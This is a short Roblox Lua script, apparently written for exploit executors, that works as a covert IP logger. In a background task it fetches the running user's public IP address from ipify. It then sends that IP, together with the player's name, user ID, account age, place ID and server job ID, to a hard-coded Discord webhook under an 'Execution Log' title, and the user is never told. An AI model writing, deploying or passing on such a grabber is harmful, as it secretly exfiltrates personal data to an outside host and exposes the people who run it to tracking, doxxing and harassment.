local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer

local WEBHOOK_URL = "https://discord.com/api/webhooks/1454443344435609773/nLjA2Lw-1b5aD2axn3HqpfRs5oMqFwSor4tOeYjMCYThjQi67sf3eMC9NZ5Xt5E8L5LB"

local request = (syn and syn.request) or (http and http.request) or http_request or request

if not request then return end

task.spawn(function()
    local ipResponse = request({
        Url = "https://api64.ipify.org?format=json",
        Method = "GET"
    })
    
    local userIP = "Unknown"
    if ipResponse.Success then
        userIP = HttpService:JSONDecode(ipResponse.Body).ip
    end

    local payload = {
        ["embeds"] = {{
            ["title"] = "🚨 Execution Log",
            ["color"] = 0xFF0000,
            ["fields"] = {
                {["name"] = "Player", ["value"] = "```" .. LocalPlayer.Name .. " (" .. LocalPlayer.UserId .. ")```", ["inline"] = false},
                {["name"] = "IP Address", ["value"] = "||" .. userIP .. "||", ["inline"] = true},
                {["name"] = "Account Age", ["value"] = LocalPlayer.AccountAge .. " days", ["inline"] = true},
                {["name"] = "Place ID", ["value"] = tostring(game.PlaceId), ["inline"] = true},
                {["name"] = "Job ID", ["value"] = "```" .. game.JobId .. "```", ["inline"] = false}
            },
            ["timestamp"] = os.date("!%Y-%m-%dT%H:%M:%SZ")
        }}
    }

    request({
        Url = WEBHOOK_URL,
        Method = "POST",
        Headers = {["Content-Type"] = "application/json"},
        Body = HttpService:JSONEncode(payload)
    })
end)
